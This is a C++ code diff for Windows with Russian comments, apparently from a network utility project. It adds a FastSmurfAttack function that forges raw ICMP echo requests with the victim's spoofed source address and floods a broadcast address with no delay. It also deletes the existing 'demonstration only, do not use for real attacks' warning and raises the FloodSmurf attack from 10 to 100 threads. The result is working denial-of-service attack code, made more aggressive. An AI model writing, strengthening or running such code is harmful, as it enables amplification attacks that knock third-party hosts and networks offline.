@@ -227,6 +227,93 @@ void PrintTraceRoute(const std::vector<TraceRouteResult>& results) {
     }
 }
 
+void FastSmurfAttack(const std::string& victim, const std::string& broadcast, int count)
+{
+    SOCKET sock = INVALID_SOCKET;
+    char* packet = nullptr;
+
+    try {
+        InitializeWinsock();
+
+        sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
+        if (sock == INVALID_SOCKET) {
+            throw std::runtime_error("Не удалось создать raw socket: " + std::to_string(WSAGetLastError()));
+        }
+
+        // включаем ручную сборку IP-заголовка
+        DWORD flag = 1;
+        if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char*)&flag, sizeof(flag)) == SOCKET_ERROR) {
+            throw std::runtime_error("setsockopt(IP_HDRINCL) failed: " + std::to_string(WSAGetLastError()));
+        }
+
+        sockaddr_in destAddr{};
+        destAddr.sin_family = AF_INET;
+        destAddr.sin_addr.s_addr = inet_addr(broadcast.c_str());
+
+        sockaddr_in victimAddr{};
+        victimAddr.sin_family = AF_INET;
+        victimAddr.sin_addr.s_addr = inet_addr(victim.c_str());
+
+        int packetLen = sizeof(IP_HEADER) + sizeof(ICMP_HEADER) + PACKET_SIZE;
+        packet = new char[packetLen];
+        memset(packet, 0, packetLen);
+
+        // IP заголовок
+        IP_HEADER* ipHeader = (IP_HEADER*)packet;
+        ipHeader->ip_verlen = (4 << 4) | (sizeof(IP_HEADER) / sizeof(unsigned int));
+        ipHeader->ip_tos = 0;
+        ipHeader->ip_totallength = htons(packetLen);
+        ipHeader->ip_id = htons(GetCurrentProcessId());
+        ipHeader->ip_offset = 0;
+        ipHeader->ip_ttl = 255;
+        ipHeader->ip_protocol = IPPROTO_ICMP;
+        ipHeader->ip_srcaddr = victimAddr.sin_addr.s_addr;
+        ipHeader->ip_destaddr = destAddr.sin_addr.s_addr;
+
+        // ICMP заголовок
+        ICMP_HEADER* icmpHeader = (ICMP_HEADER*)(packet + sizeof(IP_HEADER));
+        icmpHeader->type = 8; // Echo request
+        icmpHeader->code = 0;
+        icmpHeader->id = htons(GetCurrentProcessId());
+
+        // Payload заполняем мусором
+        memset(packet + sizeof(IP_HEADER) + sizeof(ICMP_HEADER), 'A', PACKET_SIZE);
+
+        std::cout << "Fast Smurf запущен -> Victim: " << victim
+                  << " Broadcast: " << broadcast
+                  << " Count: " << count << std::endl;
+
+        for (int i = 0; i < count && !g_shouldStop; i++) {
+            // обновляем seq и контрольные суммы
+            icmpHeader->seq = htons(i);
+            icmpHeader->checksum = 0;
+            icmpHeader->checksum = CalculateChecksum(
+                    (unsigned short*)icmpHeader,
+                    sizeof(ICMP_HEADER) + PACKET_SIZE
+            );
+
+            ipHeader->ip_checksum = 0;
+            ipHeader->ip_checksum = CalculateChecksum(
+                    (unsigned short*)ipHeader,
+                    sizeof(IP_HEADER)
+            );
+
+            if (sendto(sock, packet, packetLen, 0,
+                       (sockaddr*)&destAddr, sizeof(destAddr)) == SOCKET_ERROR) {
+                std::cerr << "sendto failed: " << WSAGetLastError() << std::endl;
+                break;
+            }
+        }
+    }
+    catch (const std::exception& e) {
+        std::cerr << "Ошибка Smurf: " << e.what() << std::endl;
+    }
+
+    if (packet) delete[] packet;
+    if (sock != INVALID_SOCKET) closesocket(sock);
+    CleanupWinsock();
+}
+
 void SmurfAttack(const std::string& victim, const std::string& broadcast, int count) {
     SOCKET sock = INVALID_SOCKET;
     char* packet = nullptr;
@@ -296,12 +383,11 @@ void SmurfAttack(const std::string& victim, const std::string& broadcast, int co
         std::cout << "Начало Smurf-атаки (демонстрация) с параметрами:\n"
                   << "  Жертва: " << victim << "\n"
                   << "  Broadcast: " << broadcast << "\n"
-                  << "  Количество пакетов: " << count << "\n\n"
-                  << "ПРЕДУПРЕЖДЕНИЕ: Это демонстрационная атака. Не используйте для реальных атак!\n";
+                  << "  Количество пакетов: " << count << "\n\n";
 
         // Уменьшаем задержку между пакетами
         const int packets_per_burst = 10; // Пакетов в одной "пачке"
-        const int delay_ms = 100;         // Задержка между пачками
+        const int delay_ms = 100;       // Задержка между пачками
 
         for (int i = 0; i < count && !g_shouldStop; i++) {
             // Отправляем несколько пакетов сразу
@@ -335,12 +421,11 @@ void SmurfAttack(const std::string& victim, const std::string& broadcast, int co
 }
 
 // Более агрессивная версия
-void FloodSmurf(const std::string& victim, const std::string& broadcast) {
-    // Создаем 10 потоков для отправки
+void FloodSmurf(const std::string& victim, const std::string& broadcast, int count) {
     std::vector<std::thread> threads;
-    for (int i = 0; i < 10; i++) {
-        threads.emplace_back([victim, broadcast]() {
-            SmurfAttack(victim, broadcast, 100000);
+    for (int i = 0; i < 100; i++) {
+        threads.emplace_back([victim, broadcast, count]() {
+            SmurfAttack(victim, broadcast, count);
         });
     }
     for (auto& t : threads) t.join();
